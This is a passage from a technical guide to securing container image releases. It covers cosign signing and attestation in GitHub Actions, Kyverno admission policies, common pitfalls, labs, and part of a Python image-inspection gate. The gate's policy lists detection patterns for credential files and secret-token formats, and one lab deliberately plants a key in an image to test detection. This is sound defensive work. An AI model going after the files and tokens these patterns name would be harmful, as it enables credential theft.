      - uses: sigstore/cosign-installer@v3              # pin SHA; installs cosign v3.x (check current major)

      - name: Sign index + every platform manifest (keyless)
        run: |
          cosign sign --yes --recursive \
            -a "org.opencontainers.image.source=${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}" \
            -a "org.opencontainers.image.revision=${GITHUB_SHA}" \
            -a "github.run=${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}" \
            "${IMAGE}@${DIGEST}"

      - name: Attest SBOMs (the exact files the gate scanned)
        run: |
          for plat in $(jq -r 'keys[]' <<<"$PLATFORM_DIGESTS"); do
            pd=$(jq -r --arg p "$plat" '.[$p]' <<<"$PLATFORM_DIGESTS")
            sbom="att/${plat//\//_}.sbom.spdx.json"
            # per-platform manifest: precise, for anything that pulls by platform digest
            cosign attest --yes --type spdxjson --predicate "$sbom" "${IMAGE}@${pd}"
            # index: Kyverno resolves the tag to the index digest, so attach there too
            cosign attest --yes --type spdxjson --predicate "$sbom" "${IMAGE}@${DIGEST}"
          done

      - name: Attest gate report (custom predicate)
        run: |
          cosign attest --yes \
            --type https://acme.example/attestations/image-gate/v1 \
            --predicate att/gate-report.json \
            "${IMAGE}@${DIGEST}"

      - name: SLSA build provenance (GitHub artifact attestation)
        uses: actions/attest-build-provenance@v3        # pin SHA; check current major
        with:
          subject-name: ${{ env.IMAGE }}
          subject-digest: ${{ env.DIGEST }}
          push-to-registry: true

      # ── Optional: dual-sign with Notation via AWS Signer (see §11.4) ──

      - name: Promote — add release tags to the SAME digest
        env:
          TAGS_JSON: ${{ needs.build.outputs.tags_json }}
        run: |
          for ref in $(jq -r '.tags[]' <<<"$TAGS_JSON"); do
            skopeo copy --all --preserve-digests \
              --src-authfile "$HOME/.docker/config.json" --dest-authfile "$HOME/.docker/config.json" \
              "docker://${IMAGE}@${DIGEST}" "docker://${ref}"
            got="sha256:$(skopeo inspect --raw --authfile "$HOME/.docker/config.json" "docker://${ref}" | sha256sum | cut -d' ' -f1)"
            test "$got" = "$DIGEST" || { echo "::error::$ref resolves to $got, expected $DIGEST"; exit 1; }
            echo "tagged $ref -> $DIGEST"
          done

      - name: Summary
        run: |
          {
            echo "### Published"
            echo "\`${IMAGE}@${DIGEST}\`"
            echo
            echo '```'
            cosign tree "${IMAGE}@${DIGEST}" || true
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"

  # ────────────────────────────────────────────────────────────────────────────
  # 4. VERIFY — verify like a consumer would, from scratch.
  # ────────────────────────────────────────────────────────────────────────────
  verify:
    needs: [build, gate, publish]
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      packages: read
      attestations: read
    env:
      IMAGE: ${{ needs.build.outputs.image }}
      DIGEST: ${{ needs.gate.outputs.index_digest }}
      ISSUER: https://token.actions.githubusercontent.com
    steps:
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - uses: sigstore/cosign-installer@v3

      - name: Verify signature
        run: |
          cosign verify "${IMAGE}@${DIGEST}" \
            --certificate-identity "${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/.github/workflows/release.yml@${GITHUB_REF}" \
            --certificate-oidc-issuer "$ISSUER" \
            --certificate-github-workflow-repository "$GITHUB_REPOSITORY" \
            --certificate-github-workflow-trigger push > /dev/null

      - name: Verify SBOM + gate attestations
        run: |
          ID="${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/.github/workflows/release.yml@${GITHUB_REF}"
          cosign verify-attestation "${IMAGE}@${DIGEST}" --type spdxjson \
            --certificate-identity "$ID" --certificate-oidc-issuer "$ISSUER" > /dev/null
          cosign verify-attestation "${IMAGE}@${DIGEST}" \
            --type https://acme.example/attestations/image-gate/v1 \
            --certificate-identity "$ID" --certificate-oidc-issuer "$ISSUER" \
            | jq -r '.payload' | base64 -d | jq -e '.predicate.result == "pass"'

      - name: Verify SLSA provenance
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          gh attestation verify "oci://${IMAGE}@${DIGEST}" \
            --repo "$GITHUB_REPOSITORY" \
            --signer-workflow "${GITHUB_REPOSITORY}/.github/workflows/release.yml" \
            --predicate-type https://slsa.dev/provenance/v1
```

### 11.3 Why each non-obvious decision

| Decision | Reason |
|---|---|
| OCI layout instead of `--push` | Lets you gate the exact bytes before anything is public; digest is identical after push |
| `skopeo copy --preserve-digests` | Fails loudly if any re-serialisation would change the digest |
| Re-hash the remote manifest | Belt-and-braces: proves the registry stored what was gated |
| Quarantine tag `ci-<run>` | Something must name the object at push time; nothing deploys `ci-*` (Kyverno can deny it) |
| Sign `--recursive` | Covers deployments that pin a platform digest |
| SBOM attested on index *and* platforms | Kyverno verifies the digest the Pod resolves to (normally the index); per-platform is precise for other consumers |
| Gate report as an attestation | Admission can require "our checks passed" — not just "something was signed" |
| Promote after signing | Release tags never point at an unsigned digest, even briefly |
| Job split | The job that runs the Dockerfile can't mint signatures; the job that signs runs no project code |
| `no-cache: true` on release | No cache poisoning path into release artifacts |
| `environment: production` | Branch/tag protection + optional approval + environment claim in OIDC |

> **Cleaning up quarantine tags**: GHCR tag deletion goes through the Packages API (`gh api -X DELETE /orgs/{org}/packages/container/{name}/versions/{id}` deletes a *version*, i.e. the digest — don't). Simplest: leave `ci-*` tags (they point at the same digest as the release tags) and use a retention policy for untagged digests only. In registries with tag deletion (ECR, Harbor) delete the staging tag after promotion.

### 11.4 Notation variant (AWS Signer via OIDC)

```yaml
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::111122223333:role/gha-image-signer   # trust policy pins repo + environment
          aws-region: ap-southeast-2

      - uses: notaryproject/notation-action/setup@v1
        with:
          version: "1.3.2"                       # check current

      - uses: notaryproject/notation-action/sign@v1
        with:
          plugin_name: com.amazonaws.signer.notation.plugin
          plugin_url: <AWS Signer plugin release URL>
          plugin_checksum: <sha256 of that archive>
          key_id: arn:aws:signer:ap-southeast-2:111122223333:/signing-profiles/acme_release
          target_artifact_reference: ${{ env.IMAGE }}@${{ env.DIGEST }}
          signature_format: cose
```

IAM trust policy for that role (the OIDC claim checks *are* your signing policy):

```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:acme/app:environment:production"
    }
  }
}
```

For Azure Key Vault use the `notation-azure-kv` plugin with `azure/login` (federated credential); for a self-managed CA, the HashiCorp Vault or a PKCS#11 plugin.

### 11.5 Native-runner matrix variant (when you can't cross-compile)

```yaml
  build:
    strategy:
      matrix:
        include:
          - { platform: linux/amd64, runner: ubuntu-24.04 }
          - { platform: linux/arm64, runner: ubuntu-24.04-arm }
    runs-on: ${{ matrix.runner }}
    permissions: { contents: read }
    steps:
      # … checkout, buildx …
      - uses: docker/build-push-action@v6
        with:
          platforms: ${{ matrix.platform }}
          outputs: type=oci,dest=out/layout-${{ strategy.job-index }},tar=false
          sbom: true
          provenance: mode=max
      # upload each single-platform layout as its own artifact
```

Then a `merge` job combines them. Two options:
- **Push each platform by digest** to the quarantine repo (`skopeo copy oci:out/layout-0 docker://IMAGE:ci-…-amd64`), then `docker buildx imagetools create -t IMAGE:ci-… IMAGE@<amd64> IMAGE@<arm64>` → new index digest; run the gate against the pushed result (pull it back into a layout with `skopeo copy --all docker://… oci:gated`). Sign that index digest.
- **Merge layouts locally** with `regctl` / `oras` into one OCI layout and gate it before any push (more plumbing, keeps "nothing public before gating").

Note `imagetools create` writes a *new* index — fine here because it's the first time this index exists; just never use it to "retag" an already-signed index.

---

## 12. Verification and Kyverno admission

### 12.1 Kyverno basics for image verification

- **`ImageValidatingPolicy`** (`policies.kyverno.io/v1`, stable since Kyverno 1.19; `v1alpha1` in 1.14–1.15) is the CEL-based successor to `ClusterPolicy` `verifyImages` rules (which are now deprecated). There's also `NamespacedImageValidatingPolicy` for team-owned policies.
- Building blocks: `matchImageReferences` (which images), `attestors` (who you trust: cosign key/keyless/cert, or notary certs), `attestations` (which attestation types: `intoto.type` predicate types, or `referrer.type` OCI artifact types), and CEL `validations` using `verifyImageSignatures`, `verifyAttestationSignatures`, `extractPayload`.
- `validationConfigurations`: `mutateDigest: true` (rewrite `app:1.2.3` → `app@sha256:…` in the Pod so what runs == what was verified), `verifyDigest: true`, `required: true`.
- `extractPayload()` returns the **predicate** and requires the attestation to have been verified first in the same expression — use `&&` so verification short-circuits extraction.

Install with Helm; make sure the admission controller has egress to your registry and (for keyless) to the Sigstore TUF/Rekor endpoints, or configure a TUF mirror / trusted root.

### 12.2 Policy: cosign keyless + SBOM + provenance + gate report (public repos)

`deploy/kyverno/ivpol-cosign.yaml`:

```yaml
apiVersion: policies.kyverno.io/v1
kind: ImageValidatingPolicy
metadata:
  name: acme-release-images
  annotations:
    policies.kyverno.io/description: >-
      Images from ghcr.io/acme must be signed by the acme release workflow on a v* tag,
      carry a signed SPDX SBOM, a signed passing gate report, and SLSA provenance from the same repo.
spec:
  validationActions: [Audit]          # roll out in Audit, then switch to [Deny]
  failurePolicy: Fail
  webhookConfiguration:
    timeoutSeconds: 25
  evaluation:
    background:
      enabled: true                   # re-check running workloads → PolicyReports
  matchConstraints:
    resourceRules:
      - apiGroups: [""]
        apiVersions: ["v1"]
        operations: ["CREATE", "UPDATE"]
        resources: ["pods"]
  matchImageReferences:
    - glob: "ghcr.io/acme/*"
  validationConfigurations:
    mutateDigest: true
    verifyDigest: true
    required: true
  attestors:
    - name: release
      cosign:
        keyless:
          identities:
            - issuer: https://token.actions.githubusercontent.com
              subjectRegExp: '^https://github\.com/acme/[a-z0-9-]+/\.github/workflows/release\.yml@refs/tags/v[0-9]+\.[0-9]+\.[0-9]+$'
        ctlog:
          url: https://rekor.sigstore.dev
  attestations:
    - name: sbom
      intoto:
        type: https://spdx.dev/Document
    - name: provenance
      intoto:
        type: https://slsa.dev/provenance/v1
    - name: gate
      intoto:
        type: https://acme.example/attestations/image-gate/v1
  validations:
    - message: image is not signed by an acme release workflow
      expression: >-
        images.containers.map(image,
          verifyImageSignatures(image, [attestors.release])).all(n, n > 0)

    - message: image has no signed SBOM
      expression: >-
        images.containers.map(image,
          verifyAttestationSignatures(image, attestations.sbom, [attestors.release])).all(n, n > 0)

    - message: build-time image gate did not pass
      expression: >-
        images.containers.map(image,
          verifyAttestationSignatures(image, attestations.gate, [attestors.release]) > 0 &&
          extractPayload(image, attestations.gate).result == 'pass').all(ok, ok)

    - message: provenance missing or not from an acme repository tag build
      expression: >-
        images.containers.map(image,
          verifyAttestationSignatures(image, attestations.provenance, [attestors.release]) > 0 &&
          extractPayload(image, attestations.provenance).buildDefinition.externalParameters.workflow.repository.startsWith('https://github.com/acme/') &&
          extractPayload(image, attestations.provenance).buildDefinition.externalParameters.workflow.ref.startsWith('refs/tags/v')
        ).all(ok, ok)
```

Notes:
- `images.containers` covers `containers`; add equivalent validations for `images.initContainers` and `images.ephemeralContainers` (or match them in one expression) — attackers use init containers precisely because policies forget them.
- Pod controllers (Deployment, StatefulSet…): Kyverno's autogen evaluates the Pod template so failures surface on the Deployment rather than as a silently failing ReplicaSet — confirm the autogen behaviour/field for your Kyverno version.
- Attestation names must be valid CEL identifiers (camelCase, no `-`), or use `attestations["my-name"]`.

### 12.3 Private repos: GitHub's Sigstore instance

For **private** repositories, `actions/attest-build-provenance` signs with **GitHub's** Sigstore instance (different Fulcio root, timestamps from GitHub's TSA, no public Rekor). A verifier needs GitHub's trusted root:

```bash
gh attestation trusted-root > trusted_root.jsonl     # JSONL: one root per line (public-good + GitHub)
# pick the GitHub instance root line and store it:
kubectl -n kyverno create configmap github-trusted-root --from-file=trusted_root.json=github_root.json
```

```yaml
  variables:
    - name: githubTrustedRoot
      expression: >-
        resource.get("v1", "configmaps", "kyverno", "github-trusted-root").data["trusted_root.json"]
  attestors:
    - name: githubAttest
      cosign:
        keyless:
          identities:
            - issuer: https://token.actions.githubusercontent.com
              subjectRegExp: '^https://github\.com/acme/[a-z0-9-]+/\.github/workflows/release\.yml@refs/tags/v.*$'
        trustedRoot:
          expression: variables.githubTrustedRoot
        ctlog:
          insecureIgnoreTlog: true     # no public Rekor for GitHub's private instance; TSA timestamps instead
          insecureIgnoreSCT: true
```

You'll then have **two attestors**: `release` (public-good, for cosign signature/SBOM/gate) and `githubAttest` (for provenance). If you want everything on GitHub's instance (to keep private repo metadata out of public Rekor), replace `cosign sign`/`cosign attest` with `actions/attest` (generic predicate) / `actions/attest-sbom` and verify all of them with the GitHub-root attestor. Treat the `insecureIgnore*` flags as "verify via TSA instead", not "skip verification" — check your Kyverno version's docs for TSA configuration with trusted roots.

### 12.4 Policy: Notation

```yaml
apiVersion: policies.kyverno.io/v1
kind: ImageValidatingPolicy
metadata:
  name: acme-notary-signed
spec:
  validationActions: [Deny]
  matchConstraints:
    resourceRules:
      - apiGroups: [""]
        apiVersions: ["v1"]
        operations: ["CREATE", "UPDATE"]
        resources: ["pods"]
  matchImageReferences:
    - glob: "ghcr.io/acme/*"
  validationConfigurations:
    mutateDigest: true
    required: true
  attestors:
    - name: acmeCa
      notary:
        certs:
          value: |-
            -----BEGIN CERTIFICATE-----
            ...your root / signing CA...
            -----END CERTIFICATE-----
        tsaCerts:
          value: |-
            -----BEGIN CERTIFICATE-----
            ...TSA root...
            -----END CERTIFICATE-----
  attestations:
    - name: sbom
      referrer:
        type: application/spdx+json      # the artifactType you used with `oras attach`
  validations:
    - message: not signed by the acme CA
      expression: >-
        images.containers.map(image, verifyImageSignatures(image, [attestors.acmeCa])).all(n, n > 0)
    - message: SBOM missing or not signed by the acme CA
      expression: >-
        images.containers.map(image,
          verifyAttestationSignatures(image, attestations.sbom, [attestors.acmeCa])).all(n, n > 0)
```

### 12.5 Rollout and operations

1. **Audit first**: `validationActions: [Audit]` + `background.enabled: true`; read `kubectl get policyreports -A` / Policy Reporter UI for a week.
2. **Exclude system namespaces deliberately** (`kube-system`, Kyverno itself) with `matchConditions` or a `PolicyException` — and verify *their* signatures with separate policies (Kyverno, CNI, CSI images are signed upstream).
3. **failurePolicy**: `Fail` means a registry/Sigstore outage blocks deploys (and node replacement re-creating Pods!). Mitigations: Kyverno's verification cache, registry mirrors/pull-through cache that also serves referrers, longer `timeoutSeconds`, HA Kyverno replicas, and running a TUF mirror. Decide consciously; many teams `Fail` for prod namespaces and `Ignore` + background for others.
4. **Test policies in CI** with the Kyverno CLI against fixture Pods referencing real signed/unsigned images, and Chainsaw for e2e:
   ```bash
   kyverno apply deploy/kyverno/ivpol-cosign.yaml --resource test/pod-signed.yaml     # expect pass
   kyverno apply deploy/kyverno/ivpol-cosign.yaml --resource test/pod-unsigned.yaml   # expect fail
   ```
5. **Deny quarantine tags**: a tiny `ValidatingPolicy` rejecting images matching `:ci-*`.
6. **Defense in depth beyond admission**: admission only sees API requests. Node-level enforcement (CRI-O `policy.json` with sigstore signed-by; containerd 2.x image verifier plugins) stops a compromised kubelet path or static pods. Cloud options: GKE Binary Authorization, AKS Image Integrity (Ratify-based).

---

## 13. Top-1% topics, failure modes and gotchas

### 13.1 Rebuild verification
If your build is reproducible (§3.5), a second, independent builder (different runner pool or cloud) rebuilds the tag and compares digests. Matching digests = strong evidence the primary build wasn't tampered with — stronger than any provenance claim the primary builder made about itself. Publish the result as a VSA.

### 13.2 Freshness
A signature is valid forever; your risk isn't. Policies worth adding:
- Require a vulnerability attestation (`cosign attest --type vuln`) younger than N days (re-scan + re-attest nightly for deployed digests). Kyverno can compare a timestamp in the predicate against `time.now()`.
- Reject signatures older than your support window (forces rebuilds onto patched bases).

### 13.3 Identity pinning mistakes (seen in real audits)
- Unanchored regex: `github.com/acme/app` also matches `github.com/acme/app-fork-by-intern`.
- Pinning only the issuer (`token.actions.githubusercontent.com`) = **any GitHub repo in the world** can sign.
- Pinning the repo but not the workflow file → a PR that adds `.github/workflows/sign-anything.yml` (merged via a sloppy review) can produce "trusted" signatures. CODEOWNERS on `.github/` matters.
- Pinning `@refs/heads/main` but releasing from tags (or vice versa) → everything fails closed, someone "temporarily" relaxes it, forever.
- Reusable workflows: the cert SAN is the **reusable** workflow (`job_workflow_ref`) and the **caller** repo is in the extensions. Pin both.

### 13.4 Digest mutation traps
- `docker buildx imagetools create -t new-tag existing@sha256:…` with a single index source can re-serialise → new digest → unsigned. Use `skopeo`/`crane`/`regctl`/`oras` to retag.
- Registry "manifest conversion": pulling with a Docker-only `Accept` header from some registries can return a converted manifest. Always request OCI types.
- Mirrors and pull-through caches that recompress layers (rare, but some do) break diffIDs vs digests. Verify with `skopeo inspect --raw | sha256sum`.
- Copying images between registries without referrers (`skopeo copy` alone) leaves signatures behind → use `cosign copy`, `oras cp -r`, or `regctl image copy --referrers`.

### 13.5 Referrer sprawl and GC
Every rebuild/re-attest adds referrers. Registries GC untagged manifests — on some registries that includes referrers stored via fallback tags if you delete them. Know your registry's retention behaviour for `subject`-linked manifests before turning on aggressive cleanup.

### 13.6 Provenance can lie at L1/L2
If the build step can write files the provenance generator later reads, it can forge inputs. L3's point is that the provenance generator runs where the build can't touch it. Our design (separate jobs, provenance from GitHub's attest action in the publish job) means the Dockerfile `RUN`s can't influence the signed provenance — but the *publish job* trusts the gate's outputs (digests), which is why we re-hash the remote manifest rather than trusting anything blindly.

### 13.7 BuildKit `mode=max` leaks
`mode=max` provenance includes build-arg values and the full Dockerfile. Public image + secret build arg = secret on the internet. Gate on `history` (done) and grep the provenance predicate for your token patterns too.

### 13.8 Base image drift
`FROM golang:1.25@sha256:X` is reproducible but freezes CVEs. Renovate digest bumps + the upstream signature verification step (§5.2) + automatic rebuilds when the base changes (Renovate PR → merge → tag) keep you current *and* verified.

### 13.9 Multi-arch SBOM subtlety
The index has no filesystem of its own. An SBOM "for the index" is really an SBOM for one or all platforms. We attach each platform's SBOM to the index (so admission on the index digest works) and to its own platform digest (so precise consumers work). Alternative: one merged SBOM with per-platform subtrees; heavier tooling.

### 13.10 What admission can't see
Images pulled by DaemonSets created before Kyverno started, static Pods, `kubectl debug` ephemeral containers (cover `ephemeralContainers`!), images used by CI runners inside the cluster, Jobs created by operators with their own service accounts (still admitted — good), and anything pulled by the node outside the API (e.g. `crictl pull`).

### 13.11 Timeline of a perfect release (sanity checklist)

```
□ tag v1.2.3 is on a signed, reviewed commit on main (ruleset)
□ build job: no id-token, no packages:write, actions pinned by SHA, harden-runner
□ base images pinned + upstream signatures verified at bump time
□ OCI layout built with SOURCE_DATE_EPOCH, sbom=true, provenance=mode=max, no cache
□ gate: blob digests, diffIDs, secrets, setuid, root, labels, base allowlist, SBOM/provenance present → PASS
□ grype on the extracted SBOMs → PASS
□ pushed with --preserve-digests; remote digest == gated digest
□ cosign sign --recursive (identity = release.yml@refs/tags/v1.2.3)
□ SBOM attested (index + platforms), gate report attested, SLSA provenance attested
□ release tags added; each tag re-resolved == digest
□ independent verify job passes (cosign verify, verify-attestation, gh attestation verify)
□ Kyverno (Deny) admits app:1.2.3, mutates to @sha256:…; rejects app:ci-*, unsigned, foreign-signed
```

---

## 14. Hands-on labs

### Lab 1 — Take an image apart

```bash
docker run -d -p 5000:5000 --name reg registry:3
docker buildx create --name lab --driver docker-container --driver-opt network=host --use
docker buildx build --platform linux/amd64,linux/arm64 --sbom=true --provenance=mode=max \
  -t localhost:5000/demo/app:1.0 --push .

crane manifest localhost:5000/demo/app:1.0 | jq                   # index incl. unknown/unknown
AMD=$(crane manifest localhost:5000/demo/app:1.0 | jq -r '.manifests[] | select(.platform.architecture=="amd64") | .digest')
crane manifest localhost:5000/demo/app@$AMD | jq                  # platform manifest
crane config   localhost:5000/demo/app@$AMD | jq '.rootfs, .history'
# verify a diffID by hand
L0=$(crane manifest localhost:5000/demo/app@$AMD | jq -r '.layers[0].digest')
crane blob localhost:5000/demo/app@$L0 | gunzip | sha256sum       # == config.rootfs.diff_ids[0]
```

### Lab 2 — Build an image with no Dockerfile

```bash
mkdir -p rootfs && printf '#!/bin/sh\necho hello\n' > rootfs/hello && chmod +x rootfs/hello
tar -C rootfs -czf layer.tar.gz .
crane append -b gcr.io/distroless/base-debian12 -f layer.tar.gz -t localhost:5000/demo/handmade:1 --oci-empty-base=false
crane mutate localhost:5000/demo/handmade:1 --entrypoint /hello -t localhost:5000/demo/handmade:1
```
An image is just JSON + tarballs. Docker is one way of producing them.

### Lab 3 — Leak a secret and catch it

```dockerfile
FROM alpine:3.22
RUN echo "-----BEGIN OPENSSH PRIVATE KEY-----" > /root/id_ed25519
RUN rm /root/id_ed25519
```
```bash
docker buildx build --sbom=true --provenance=mode=max --output type=oci,dest=leak,tar=false .
python3 ci/inspect_image.py --layout leak --report leak.json \
  --policy <(echo '{"require_platforms":["linux/amd64"],"required_labels":[]}')
# → layer.forbidden-path, layer.secret-content, layer.deleted-secret, config.root-user
```

### Lab 4 — Sign, attest, verify locally (key-based, private Rekor-free)

```bash
cosign generate-key-pair
cosign sign --key cosign.key --tlog-upload=false localhost:5000/demo/app@<index-digest>
cosign attest --key cosign.key --tlog-upload=false --type spdxjson --predicate sbom.json localhost:5000/demo/app@<index-digest>
cosign tree localhost:5000/demo/app@<index-digest>
curl -s localhost:5000/v2/demo/app/referrers/<index-digest> | jq      # see them as OCI referrers
cosign verify --key cosign.pub --insecure-ignore-tlog localhost:5000/demo/app@<index-digest>
```

### Lab 5 — Notation round-trip

```bash
notation cert generate-test --default "lab.example"
notation sign --insecure-registry localhost:5000/demo/app@<index-digest>
oras discover --plain-http localhost:5000/demo/app@<index-digest>
# write trustpolicy.json (§10.4) with registryScopes ["localhost:5000/demo/app"], import, then:
notation verify --insecure-registry localhost:5000/demo/app@<index-digest>
```

### Lab 6 — Kyverno on kind

```bash
kind create cluster
helm repo add kyverno https://kyverno.github.io/kyverno/ && helm install kyverno kyverno/kyverno -n kyverno --create-namespace
kubectl apply -f deploy/kyverno/ivpol-cosign.yaml          # set validationActions: [Deny] for the lab
kubectl run ok  --image=ghcr.io/acme/app:1.2.3             # admitted, image mutated to @sha256
kubectl run bad --image=ghcr.io/acme/app:ci-123-1          # denied if you add the quarantine rule
kubectl get pod ok -o jsonpath='{.spec.containers[0].image}'
```

---

## Appendix A — `inspect_image.py` (full source)

Stdlib only (Python 3.14+ for zstd layers, or `pip install zstandard`). Tested against a synthetic multi-arch OCI layout with planted problems; every check fired and diffIDs verified on intact layers.

```python
#!/usr/bin/env python3
"""
inspect_image.py -- pre-push policy gate for an OCI image layout produced by BuildKit.

What it does (stdlib only; Python 3.14+ gets zstd support from the stdlib,
older versions need `pip install zstandard` for zstd layers):

  * walks index.json -> image index -> per-platform manifests (+ BuildKit attestation manifests)
  * verifies every blob's sha256 and size against its descriptor (layout integrity)
  * decompresses every layer and checks the uncompressed sha256 against config.rootfs.diff_ids
  * per layer: forbidden paths, secret-looking content, setuid/setgid, world-writable,
    device files, path traversal, oversized files, secrets "deleted" by whiteouts in later layers
  * per config: root user, secret-looking ENV keys, build-arg secrets leaked into history,
    required labels, layer count / size budgets, reproducible timestamps
  * attestations: requires SBOM + provenance per platform, checks base images against an allowlist,
    extracts SBOM / provenance predicates to files for later signing
  * writes a JSON report (later attested as a custom in-toto predicate) and exits 1 on any error

Usage:
  python3 inspect_image.py --layout out/layout --policy ci/image-policy.json \
      --report out/attestations/gate-report.json --extract-dir out/attestations \
      [--source-date-epoch 1760000000] [--github-output]
"""
from __future__ import annotations

import argparse
import gzip
import hashlib
import io
import json
import os
import re
import stat
import sys
import tarfile
from datetime import datetime, timezone

INDEX_TYPES = {
    "application/vnd.oci.image.index.v1+json",
    "application/vnd.docker.distribution.manifest.list.v2+json",
}
MANIFEST_TYPES = {
    "application/vnd.oci.image.manifest.v1+json",
    "application/vnd.docker.distribution.manifest.v2+json",
}
SBOM_PREDICATES = {"https://spdx.dev/Document", "https://cyclonedx.org/bom"}
PROVENANCE_PREDICATES = {"https://slsa.dev/provenance/v0.2", "https://slsa.dev/provenance/v1"}

DEFAULT_POLICY: dict = {
    "require_platforms": ["linux/amd64", "linux/arm64"],
    "max_layers": 30,
    "max_uncompressed_bytes": 1_000_000_000,
    "max_single_file_bytes": 200_000_000,
    "forbid_root_user": True,
    "required_labels": ["org.opencontainers.image.source", "org.opencontainers.image.revision"],
    "forbidden_path_regexes": [
        r"(^|/)\.git(/|$)",
        r"(^|/)\.env(\..*)?$",
        r"(^|/)id_(rsa|dsa|ecdsa|ed25519)$",
        r"(^|/)\.aws/credentials$",
        r"(^|/)\.docker/config\.json$",
        r"(^|/)\.kube/config$",
        r"(^|/)\.(npmrc|pypirc|netrc)$",
        r"\.tfstate(\.backup)?$",
    ],
    "secret_content_regexes": [
        r"-----BEGIN (RSA |EC |DSA |OPENSSH |ENCRYPTED )?PRIVATE KEY-----",
        r"AKIA[0-9A-Z]{16}",
        r"ghp_[A-Za-z0-9]{36}",
        r"github_pat_[A-Za-z0-9_]{60,}",
        r"xox[abprs]-[A-Za-z0-9-]{10,}",
    ],
    "content_scan_max_bytes": 1_048_576,
    "secret_env_key_regex": r"(?i)(secret|token|passw(or)?d|api[_-]?key|private[_-]?key|credential)",
    "allow_env_keys": [],
    "history_secret_regex": r"(?i)\b[A-Z0-9_]*(TOKEN|SECRET|PASSWORD|PASSWD|API_KEY)[A-Z0-9_]*=[^\s$]+",
    "allow_setuid_paths": [],
    "require_sbom": True,
    "require_provenance": True,
    "allowed_base_image_regexes": [],  # empty = do not enforce
}


# --------------------------------------------------------------------------- helpers
class Findings:
    def __init__(self) -> None:
        self.items: list[dict] = []

    def add(self, severity: str, check: str, message: str, platform: str = "-", **extra) -> None:
        self.items.append({"severity": severity, "check": check, "platform": platform,
                           "message": message, **extra})

    def errors(self) -> int:
        return sum(1 for f in self.items if f["severity"] == "error")


class HashingReader(io.RawIOBase):
    """Wraps a stream; sha256-hashes everything read through it (used to compute diffIDs)."""

    def __init__(self, f) -> None:
        self.f = f
        self.h = hashlib.sha256()
        self.n = 0

    def readable(self) -> bool:
        return True

    def readinto(self, b) -> int:
        data = self.f.read(len(b))
        n = len(data)
        b[:n] = data
        self.h.update(data)
        self.n += n
        return n


def zstd_reader(f):
    try:
        from compression import zstd  # Python 3.14+
        return zstd.ZstdFile(f)
    except ImportError:
        pass
    try:
        import zstandard  # type: ignore
        return zstandard.ZstdDecompressor().stream_reader(f)
    except ImportError:
        return None


def platform_str(p: dict | None) -> str:
    if not p:
        return "unknown"
    s = f"{p.get('os', 'unknown')}/{p.get('architecture', 'unknown')}"
    return s + (f"/{p['variant']}" if p.get("variant") else "")


def norm(name: str) -> str:
    while name.startswith("./"):
        name = name[2:]
    return name.lstrip("/")


class Layout:
    def __init__(self, root: str, findings: Findings) -> None:
        self.root = root
        self.f = findings
        self.verified: set[str] = set()

    def path(self, digest: str) -> str:
        alg, hexd = digest.split(":", 1)
        return os.path.join(self.root, "blobs", alg, hexd)

    def verify_blob(self, desc: dict) -> bool:
        d = desc["digest"]
        if d in self.verified:
            return True
        p = self.path(d)
        if not os.path.exists(p):
            self.f.add("error", "layout.missing-blob", f"blob {d} referenced but not present")
            return False
        h, size = hashlib.sha256(), 0
        with open(p, "rb") as fh:
            for chunk in iter(lambda: fh.read(1 << 20), b""):
                h.update(chunk)
                size += len(chunk)
        if "sha256:" + h.hexdigest() != d:
            self.f.add("error", "layout.digest-mismatch", f"blob {d} content hash is sha256:{h.hexdigest()}")
            return False
        if desc.get("size") is not None and desc["size"] != size:
            self.f.add("error", "layout.size-mismatch", f"blob {d} size {size} != descriptor {desc['size']}")
            return False
        self.verified.add(d)
        return True

    def json_blob(self, desc: dict) -> dict:
        self.verify_blob(desc)
        with open(self.path(desc["digest"]), "rb") as fh:
            return json.load(fh)


# --------------------------------------------------------------------------- checks
def scan_layer(lay: Layout, desc: dict, idx: int, platform: str, policy: dict,
               state: dict, f: Findings) -> tuple[str | None, int]:
    """Returns (diffID, uncompressed size). `state` carries cross-layer info for whiteout detection."""
    mt = desc.get("mediaType", "")
    raw = open(lay.path(desc["digest"]), "rb")
    if mt.endswith("+gzip") or mt.endswith(".tar.gzip"):
        stream = gzip.GzipFile(fileobj=raw)
    elif mt.endswith("+zstd"):
        stream = zstd_reader(raw)
        if stream is None:
            f.add("error", "layer.unsupported", "zstd layer but no zstd support (use Python 3.14+ or pip install zstandard)", platform)
            return None, 0
    elif mt.endswith(".tar") or mt.endswith("v1.tar"):
        stream = raw
    else:
        f.add("warn", "layer.mediatype", f"layer {idx} has unexpected mediaType {mt}; skipped", platform)
        return None, 0

    hr = HashingReader(stream)
    forbidden = [re.compile(r) for r in policy["forbidden_path_regexes"]]
    secrets = [re.compile(r.encode()) for r in policy["secret_content_regexes"]]
    allow_suid = set(policy["allow_setuid_paths"])
    max_scan = policy["content_scan_max_bytes"]
    sensitive: dict[str, int] = state.setdefault("sensitive", {})

    with tarfile.open(fileobj=hr, mode="r|") as tf:
        for m in tf:
            name = norm(m.name)
            base = os.path.basename(name)
            where = f"layer {idx} ({desc['digest'][:19]}): /{name}"

            # path traversal / absolute link targets that escape the rootfs
            if ".." in name.split("/"):
                f.add("error", "layer.path-traversal", where, platform)
            if m.islnk() and ".." in norm(m.linkname).split("/"):
                f.add("error", "layer.hardlink-traversal", f"{where} -> {m.linkname}", platform)

            # whiteouts: a file deleted in this layer still exists in an earlier layer
            if base.startswith(".wh."):
                parent = os.path.dirname(name)
                if base == ".wh..wh..opq":
                    gone = [p for p in sensitive if p.startswith(parent + "/")]
                else:
                    target = os.path.join(parent, base[4:]) if parent else base[4:]
